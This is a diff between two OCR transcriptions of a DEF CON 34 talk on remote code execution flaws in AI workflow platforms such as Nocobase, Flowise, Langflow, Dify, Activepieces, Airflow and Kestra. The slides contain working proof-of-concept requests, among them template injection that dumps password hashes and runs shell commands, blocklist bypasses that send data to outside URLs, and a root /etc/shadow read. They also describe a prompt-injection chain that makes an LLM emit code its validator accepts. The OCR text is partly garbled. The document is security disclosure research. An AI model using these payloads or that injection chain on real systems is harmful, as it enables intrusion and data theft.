@@ -4,17 +4,21 @@ speakers: ["Peyton Kennedy"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Peyton Kennedy - Hacking Your Life with AI Can Get You Hacked How AI Orchestration Platforms Ship RCE by Design - V1.pdf"
 pages: 58
 sha256: "0547f8584cf951c80ee246a8d42baa402c91734fbbdb7ae36b6ee89c8937c28e"
-text_chars: 27908
+text_chars: 25374
 ocr_pages: 58
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 87.5
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:27:03Z"
+converted_at: "2026-08-12T06:41:37Z"
 ---
 # Hacking Your Life with AI Can Get You Hacked How AI Orchestration Platforms Ship RCE by Design
 
@@ -22,9 +26,11 @@ converted_at: "2026-08-12T00:27:03Z"
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Peyton Kennedy - Hacking Your Life with AI Can Get You Hacked How AI Orchestration Platforms Ship RCE by Design - V1.pdf` (58 pages)
 
+
 ## Slide 1
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DEF CON 34
@@ -37,7 +43,8 @@ Peyton Kennedy +: p8Q@n-sec +: Endor Labs
 
 ## Slide 2
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 THE ASSUMPTION BEHIND ALL 7 PLATFORMS
@@ -47,7 +54,8 @@ trusted to run code on the host.”
 
 ## Slide 3
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 whoami
@@ -59,7 +67,8 @@ Endor Labs audited disclosed Java - Python : TS + Go
 
 ## Slide 4
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Section 1 - The attack surface
@@ -72,7 +81,6 @@ Nocobase_ 1S
 Dify Go-Py
 Apache Airflow
 Flowise
-TS: Py
 Activepieces 1S
 Python
 Langflow
@@ -82,7 +90,8 @@ Python
 
 ## Slide 5
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @5
@@ -105,12 +114,12 @@ G=] Code execution, root
 
 ## Slide 6
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 The spine of this talk
 Aspectrum: from accidental to intentional
-ACCIDENTAL INTENTIONAL
 ACCIDENTAL LLM AS CODE WRONG PHASE INTENTIONAL
 Tried to build security but shipped it Trusted LLM output as executable Built or applied a sandbox but to the Don't sandbox, “it's your problem.”
 broken. code. wrong phases. Kestra « Airflow
@@ -119,7 +128,8 @@ Nocobase Flowise - Langflow Dify - Activepieces
 
 ## Slide 7
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Central thesis
@@ -138,12 +148,12 @@ anyone who can reach the engine gets the host.
 
 ## Slide 8
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 8
 Nocobase - accidental end cp
-Nocobase: the “we tried” End —Necobase s/o sisk-#2wa-r3jw-sesh
 DEFENSE 01 DEFENSE 02 DEFENSE 03
 Built a sandbox Built input validation Built a Proxy guard
 SES Compartment preprocessor scrub context wrapper
@@ -153,12 +163,11 @@ Defenses are present, just a bit broken.
 
 ## Slide 9
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-9
 Nocobase « accidental end ce —
-One endpoint, lowest privilege Neovobase tise sisa-aacrsiw-sesn |
 POST /api/variables:resolve
 Evaluates user template expressions inside an SES Compartment.
 + Resolves placeholders in workflow config
@@ -172,7 +181,8 @@ The lowest-privileged account can reach the sandbox.
 
 ## Slide 10
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 10
@@ -188,12 +198,12 @@ Defense in depth to defeated in depth.
 
 ## Slide 11
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 11
 Nocobase + accidental end Cp
-Failure #1: the preprocessor is string matching | vse ts ssr-sau-rsie-sesn
 // resolver.ts:198 scrubs "ctx." and "ctx[" with indexOf ()
 // rename ctx inside an arrow fn and it's invisible:
 ((c) => c.koaCtx.app.db.sequelize.query('SQL'))(ctx) «+ "c.koaCtx" # "ctx."
@@ -206,11 +216,11 @@ that reach the context.
 
 ## Slide 12
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Nocobase - accidental end Cp
-Whatis SES (Secure ECMASCript)? | nocobase tsinoie ) ( cisa-42ue-r3jw-6esh
 Hardened-JS isolation. Agoric's Endo project, the basis for TC39 Compartments.
 import 'ses';
 lockdown(); // freeze the intrinsics
@@ -231,7 +241,8 @@ lla
 
 ## Slide 13
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 12
@@ -248,8 +259,6 @@ const v = Reflect.get(target, key, receiver);
 return typeof v === 'function' ? v.bind(target) : v;
 } koaCtx is a live handle to the Koa request, and through it ctx. app. db, the Sequelize
 instance, and the full runtime.
-ho
-ys
 leaked koaCtx —» app.db.sequelize -—» | .query()>DB
 TS private compiles to a normal property. The guard was meant to be the
 endowment boundary, so this hands a powerful object straight into the
@@ -258,13 +267,11 @@ compartment.
 
 ## Slide 14
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 13
-Nocobase -
-accidental chd OD
-LeekdewnH-
 Failure #3: the lock is commented out
 // resolver.ts:14-25
 | // \ockdown(); // TODO «+ SES intrinsic hardening: disabled
@@ -273,25 +280,19 @@ They had the control and disabled the lock.
 
 ## Slide 15
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 14
 Nocobase « accidental end Cp
 The exploit: one request, full DB — OS | recovase rs/iose | sist-a2wn-r3jw-6esh
 os
-. . . dump + password COPY ...TO
-memberlogin | — POST variables:resolve —» _ sequelize.query() —> command
-Tiles et i anil users _hashes PROGRAM cue
 POC 1 + DUMP CREDENTIALS
-POST /api/variables: resolve HTTP/1.1
-Host: TARGET: 13000
 Authorization: Bearer $TOKEN # member role
 Content-Type: application/json
 {"values":{"template":"{{ ((c)=>c.koaCtx.app.db.sequelize.query(\"SELECT id,email,password FROM users\")) (ctx) }}"}}
 The users table, hashes included, in the response.
-POST /api/variables: resolve HTTP/1.1
-Host: TARGET: 13000
 Authorization: Bearer $TOKEN # member role
 Content-Type: application/json
 {"values":{"template":"{{ ((c)=>c.koaCtx.app.db.sequelize.query(\"COPY (SELECT 1) TO PROGRAM ‘id > /tmp/pwned'\")) (ctx) }}"}}
@@ -300,7 +301,8 @@ Postgres COPY .. TO PROGRAMruns a shell command on the host.
 
 ## Slide 16
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 15
@@ -317,7 +319,6 @@ return (${optionsStr}); }*)({})
 // empty {} > lookups fall through to
 window
 1 Builder writes a poisoned tit le via
-flowModels: save
 2 Any loggedIn user renders it, payload fires in their
 browser
 3 fetch() exfiltrates the JWT from LocalStorage
@@ -334,7 +335,6 @@ passes
 2 updateittoSELECT *« FROM users, no validation
 3 : list the collection > rows returned
 Hashes dumped; on PostgreSQL db link /
-pg_read_file reach other DBs & host files.
 SQLi via recursive CTE 7.5 HIGH
 @nocobase/database - eager-loading-tree.ts:59 -
 CVE-2026-41640
@@ -352,7 +352,8 @@ COPY ... TO PROGRAM reaches OS exec.
 
 ## Slide 17
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Nocobase sets the floor
@@ -363,10 +364,10 @@ Sometimes, due to classic vulnerabilities.
 
 ## Slide 18
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-LZ
 Flowise -
 Langflow: LLM as code
 Section 2.2 - Anew injection class
@@ -376,12 +377,12 @@ We spenta “input: ) user input.
 
 ## Slide 19
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 18
 Flowise - Langflow: LLM as code i
-Aregex blocklist for LLM Python Fowise tsrvsise | sust-w7<8-a2ap-seag
 # validatePythonCodeForDataFrame(): reject on match
 38 /\bimport\b/
 /\beval\sx\ (/
@@ -392,12 +393,13 @@ Reject on match. Accept everything else.
 
 ## Slide 20
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 19
 Flowise - Langflow: LLM as code Oe
-The fatal setup: the executor pre-imports the Fionines (Teemyodian)  ( sh-wfst-atoe-fepo
+The fatal setup: the executor pre-imports the Fionines (Teemyodian) ( sh-wfst-atoe-fepo
 danger
 Before running LLM code, executor prepends:
 Entire pandas / numpy API reachable, with no import keyword in the
@@ -408,19 +410,15 @@ Block imports all you want. The dangerous API is already in scope.
 
 ## Slide 21
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 20
 Flowise - Langflow: LLM as code i
-One blocklist, Six Ways ArOUN It | Fowise rvs | stsa-w7x8-a29p-seas
 A 38-pattern regex blocklist, and the payloads that walk straight through.
 VERDICT PAYLOAD
-( / BYPASSED ) pd. read_json("http://.."+df.to_json() )
 (V BYPASSED ) pd. read_csv("http://169.254.169.254/...")
-( ‘YBYPASSED ) pd. read_html("http://.."+df.to_html() )
-(V BYPASSED ) np.ctypeslib. load_library (...)
-(VBYPASSED ) chr(101)+chr(118)+chr(97)+chr(108)
 ( VBYPASSED ) importlib
 X BLOCKED import os
 Blocklists enumerate the bad. The bad is unbounded.
@@ -436,7 +434,8 @@ The one literal control case
 
 ## Slide 22
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Flowise - Langflow: LLM as code Oe
@@ -462,7 +461,8 @@ execute.
 
 ## Slide 23
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Flowise : Langflow: LLM as code a
@@ -473,11 +473,11 @@ Dataset Exfil
 
 ## Slide 24
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Flowise - Langflow: LLM as code Oe
-Full chain: unauthenticated prompt — RCE / exfil ‘owise service | sisawx8-a2gp-seay
 01 + ENTRY 02 + INJECT 03 - GENERATE 04 + VALIDATE 05 + EXECUTE @6 + IMPACT
 Unauth POST Prompt injection LLM emits Validator Pyodide runs it Dataset —
 /api/v1/prediction/< | —* in the chat message | —> bypass code — PASSES — | full cPython, in- — attacker
@@ -494,12 +494,12 @@ Single prompt. Full compromise. No authentication.
 
 ## Slide 25
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 23
 Flowise - Langflow: LLM as code Oe iw
-Langflow: same story, simpler bypass ‘2s'ow | sts«-stpn-sass-204
 # lambda_filter.py, the ENTIRE validation:
 def _validate_lambda(self, t): return t.strip().startswith("lambda") and ":" in t
 fn = eval(lambda_text) + eval() on LLM output
@@ -508,7 +508,8 @@ Starts with “lambda,” has a colon. That's it.
 
 ## Slide 26
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Flowise + Langflow: LLM as code Oe iw
@@ -518,7 +519,8 @@ Langflow Lambda trouble: Chat transform to Shell
 
 ## Slide 27
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 23b
@@ -533,33 +535,30 @@ drives the node to emit lambda x: __import__('os').system('id')
 entire check: startswith("lambda") and ":" in t
 4 eval() runs the lambda
 fn = eval(lambda_text), arbitrary Python on the host
-5 Calculator!!!
 open -a Calculator runs without any error
 ```
 
 ## Slide 28
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Flowise - Langflow: LLM as code Oe iw
-custom_component: exec ( ) on user Langflow Python) (GHSA-Bxre-2}r4-78]7
 Python
 the endpoint
 POST /api/v1/custom_component
 PoC +: payload in __init__
 accepts a JSON "code" field of raw Python
 class RCE(Component) :
-def __ init__(self, *xkw):
-super().__init__(*kkw)
-the sink - validate. py:442 os.system('touch /tmp/pwned') ~« on validate
 exec(compiled_class, exec_globals, exec_locals) «+
 no sandbox
 ```
 
 ## Slide 29
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 25
@@ -579,7 +578,8 @@ Fires the moment an MCP Tools node selects the server. Command substitution on t
 
 ## Slide 30
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Flowise - Langflow: LLM as code Oe iw
@@ -598,7 +598,8 @@ One env var flips “trusted user” to “anyone.”
 
 ## Slide 31
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Flowise -
@@ -611,11 +612,11 @@ Fix = AST allowlisting or PROPER sandboxing. None of them have it.
 
 ## Slide 32
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Dify -
-Activepieces: wrong phase ee _ )
 Section 2.3 - Asandbox is not a sandbox
 The right primitive, activated one phase too late
 Every “sandbox” here is the same job under different names: block dangerous syscalls (seccomp), fake the filesystem root
@@ -629,14 +630,13 @@ The isolation is real. |t just runs after the attacker.
 
 ## Slide 33
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 29
-Dify - Activepieces: wrong phase i s( @ Si
 Dify: the bootstrap ordering > ~~
 # internal/core/runner/python/prescript.py
-os. chdir(running_path)
 | {{preload}} «- runs as ROOT: no seccomp, no chroot
 lib.DifySeccomp({{uid}}, {{gid}}, {{enable_network}}) « confinement happens AFTER
 | with os.fdopen(3,"rb") as code_fd: « user code (finally sandboxed)
@@ -646,12 +646,12 @@ The sandbox protects everything except the thing the attacker controls.
 
 ## Slide 34
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 30
-Dify - Activepieces: wrong phase  ¢iss( @ Sei
-The timeline «iy «ye
+Dify - Activepieces: wrong phase ¢iss( @ Sei
 DANGER ZONE - unconfined
 + preloadruns as uid 0
 + CapEff = full capability mask
@@ -665,36 +665,30 @@ SAFE ZONE - confined
 
 ## Slide 35
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Dify - Activepieces: wrong phase i s( @ Si
-PoC: read /etc/sShadowas root © diy «0»
 POST /v1/sandbox/run enable_preload = true X-Api-Key: dify-sandbox
 REQUEST RESPONSE — RUNS BEFORE THE SANDBOX DROPS
 POST /v1/sandbox/run HTTP/1.1 {"code":0,"message":"success","data":{
-Host: localhost:8194 Nennares, stdout:
-X-Api-Key: dify—sandbox euidmaee
 Content-Type: application/json
 { Uid: 0000
 "Language": "python3", CapEff: 0000000a80425fb
 "code": "def main(): return {}", NoNewPrivs: 20
 "preload": "import os,subprocess; id = uid=0(root) gid=0(root)
 print(\"euid =\", os.geteuid());
-print (open(\"/etc/shadow\"). read()
-.splitlines()[:1])", Ht
 “enable_network": true
-p
 shadow = ['root:*::0:99999:7:::']
 Reproduced against dif y—sandbox: 0.2.15. The preload string runs as uid 0, before Dif ySeccomp() ever fires. ( default X-Api-Key = dify-sandbox 7
 ```
 
 ## Slide 36
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Dify - Activepieces: wrong phase ee _ )
 Persistence: poison python . SO © dity «ye
 attacker writes — Run #2 (other tenant)
 /var/sandbox/sandbox—python/python. so — Run#s3
@@ -707,10 +701,10 @@ One exploit = persistent root over every future run, including other tenants’.
 
 ## Slide 37
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Dify - Activepieces: wrong phase i s( @ Si
 Dify: where the trust boundaries actually sit > «~~
 ssrf_proxy_network +: internal, no host route
 dify-sandbox : 8194
@@ -718,7 +712,6 @@ dify-sandbox : 8194
 USER CODE : Code node
 A v seccomp + chroot + uid/gid drop - caps
 Ly boundary B leaks — raw TCP sockets bypass squid
-api: 5001
 /inner/api + committed default key
 plugin_daemon : 5002
 control-plane + dual-homed 1
@@ -739,10 +732,10 @@ traffic through it.
 
 ## Slide 38
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Dify : Activepieces: wrong phase ee _ )
 The fix is one line but they accepted the risk >) «=
 the one-line fix maintainer response | CLOSED - WORKING AS DESIGNED
 + Raisedin issue #27, preload disabled by default in PR #96. Known since
@@ -762,11 +755,12 @@ disappears
 
 ## Slide 39
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 35
-Dify : Activepieces: wrong phase ee  _)
+Dify : Activepieces: wrong phase ee _)
 Activepieces: same mistake, one layer Up —*xtverieces tse sust-arsn-e2j7-rs2e
 index.js (compiled):
 var child_process = require("child_process");
@@ -779,25 +773,24 @@ Co-reported with Aviral2642 - qluf3ng
 
 ## Slide 40
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 75/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 36
-Dify : Activepieces: wrong phase ee  _)
-Secrets out of a “sandboxed” step *tiverieces tomose | stsk-grsn-eaj7-rszg |
+Dify : Activepieces: wrong phase ee _)
 { "executionMode": "SANDBOX_CODE_ONLY", “user": "root",
 "id": "uid=@(root) gid=@(root)",
-"ENCRYPTION_KEY": "82244b..", "JWT SECRET": "ZVCRICW5q..." }
 AP_ENCRYPTION_KEY + AP_JWT_SECRET read despite SANDBOX_CODE_ONLY.
 ```
 
 ## Slide 41
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 37
-Dify - Activepieces: wrong phaSe@ a @ Sei
 Command injection via the step Activepieces (Ts/tiode ) ) ( Gish-spfy-seap-5tvs
 name
 step name
@@ -814,10 +807,10 @@ Co-reported with kodareef5 + Aviral2642
 
 ## Slide 42
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Dify - Activepieces: wrong phaSe@ a @ Sei
 Section takeaway
 Areal isolation primitive applied to the wrong
 phase.
@@ -826,7 +819,8 @@ Whatever runs first becomes the attack surface.
 
 ## Slide 43
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 39
@@ -839,12 +833,12 @@ Don't sandbox. Don't validate. “The workflow author is trusted.”
 
 ## Slide 44
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Airflow - Kestra: intentional end ee  _ )
+Airflow - Kestra: intentional end ee _ )
 Airflow: trigger # author sr2cheairiow yo» cve-2026-30898
-# providers/standard/operators/bash. py: 235
 | subprocess.run(["bash", "-c", self.bash_command], ...) « rendered conf, unescaped
 1 + the DAG an author ships 2 + PoC « trigger the DAG
 from airflow.operators.bash import BashOperator POST /api/v1/dags/notify/dagRuns
@@ -857,11 +851,11 @@ Standard trigger permission — author's code-exec privilege.
 
 ## Slide 45
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 41
-Airflow - Kestra: intentional enc eee iii @ Sa
 Documentation as attack Surface *recheririow ryenon | cve-2026-30898
 core—concepts/dag-run. rst operators/bash.rst
 NO WARNING CAUTION BLOCK
@@ -884,10 +878,10 @@ The getting-started guide taught the bug. A developer copies the first example a
 
 ## Slide 46
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Airflow - Kestra: intentional enc eee iil @ a>
 Kestra: two 9.8s, both closed “intended” | «sta >=
 interpreter
 Property<List<String>> » dynamic Pebble
@@ -908,11 +902,11 @@ beforeCommands: ["echo {{ trigger.body.command }}"']
 
 ## Slide 47
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 43
-Airflow - Kestra: intentional enc eee iil @ a>
 The “trusted author” argument collapses | «s 2~
 1 + the flow an author ships 2 + PoC + unauthenticated webhook
 id: rce_via_beforecommands POST /api/v1/executions/webhook/default/
@@ -922,7 +916,7 @@ key: test123 —%, Content-Type: application/json
 tasks:
 — type: scripts.shell.Commands {"command": "hello; touch /tmp/pwned"}
 beforeCommands: the host
-- "echo {{ trigger.body.command }}"  «
+- "echo {{ trigger.body.command }}" «
 Pebble sink
 Webhooks are unauthenticated by default. The boundary they invoke doesn't exist.
 - runs on
@@ -930,7 +924,8 @@ Webhooks are unauthenticated by default. The boundary they invoke doesn't exist.
 
 ## Slide 48
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Live demo
@@ -939,11 +934,11 @@ No account. Just a webhook.
 
 ## Slide 49
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 43b
-Airflow - Kestra: intentional enc eee iil @ a>
 What the demo showed: no account, just a webhook | testa >
 1 A flow already exists
 webhook trigger + beforeCommands, authored once by any user
@@ -959,7 +954,8 @@ runs outside any auth boundary
 
 ## Slide 50
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Section 3 - Pattern analysis
@@ -973,7 +969,8 @@ Airflow trigger
 
 ## Slide 51
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 The realization
@@ -983,12 +980,12 @@ shipped as single-user dev tools.
 
 ## Slide 52
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Section 4 - Methodology
 The 5-step audit method
-CISIGIOl®
 Map input surfaces. webhooks - APIs - Ul forms - LLM outputs - triggers
 Trace input — code exec. templates - exec/eval - ProcessBuilder - subprocess - sandbox bootstraps. Read the bootstrap and
 order.
@@ -999,7 +996,8 @@ Check the docs for vulnerable patterns taught as usage.
 
 ## Slide 53
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Why it survives
@@ -1041,7 +1039,8 @@ none - subprocess
 
 ## Slide 54
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 48
@@ -1054,7 +1053,8 @@ sandbox around
 
 ## Slide 55
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Takeaways
@@ -1065,7 +1065,6 @@ Scope perms as code-exec, not “just a workflow.” Trigger permission = the au
 Kill the dangerous default flags. SANDBOX_ENABLE_NETWORK - LANGFLOW_SKIP_AUTH_AUTO_LOGIN -
 enable_preload
 Audit every trigger path. Use the 5-step method
-CK) OO) &
 Assume compromise persists across runs. Check shared sandbox paths for a planted . so loader
 Put auth in front of it. Trigger paths are unauthenticated by default: /prediction - /executions/webhook -
 Flowise Kestra
@@ -1080,7 +1079,8 @@ Dify
 
 ## Slide 56
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Until vendors admit these are code-execution platforms
@@ -1091,7 +1091,8 @@ By design.
 
 ## Slide 57
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Thank you.
@@ -1099,12 +1100,12 @@ Peyton Kennedy
 github. com/p80n-sec
 Questions?
 p8@n-sec - Endor Labs
-Linkedin. com/in/peytonkennedysecurity
 ```
 
 ## Slide 58
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
